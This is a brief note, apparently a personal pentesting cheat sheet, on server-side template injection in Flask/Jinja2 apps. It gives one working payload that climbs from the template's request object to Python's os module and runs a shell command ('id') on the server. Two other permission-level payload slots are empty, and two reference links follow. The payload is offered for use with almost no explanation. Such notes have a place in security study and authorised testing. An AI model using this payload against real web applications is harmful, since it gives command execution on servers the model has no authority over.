^^^^^^^^^^^^^^^
```
Flask/Jinja2 Exploit: [SSTI] = Server Side Template Injection

Permission Level:
ADMIN:
Payload: {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

LOW LEVEL ADMIN:
Payload:

NO PRIVILEGE ADMIN:
Payload:

Docs:
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti
https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee```
